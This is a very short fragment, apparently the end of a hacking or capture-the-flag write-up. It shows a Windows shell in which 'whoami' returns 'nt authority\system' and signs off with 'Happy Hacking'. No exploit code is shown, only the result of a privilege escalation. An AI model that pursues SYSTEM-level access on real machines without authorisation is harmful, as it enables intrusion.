Microsoft Windows [Version 10.0.17763.5329]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32>whoami  
whoami  
nt authority\system
```

`~Happy Hacking.`

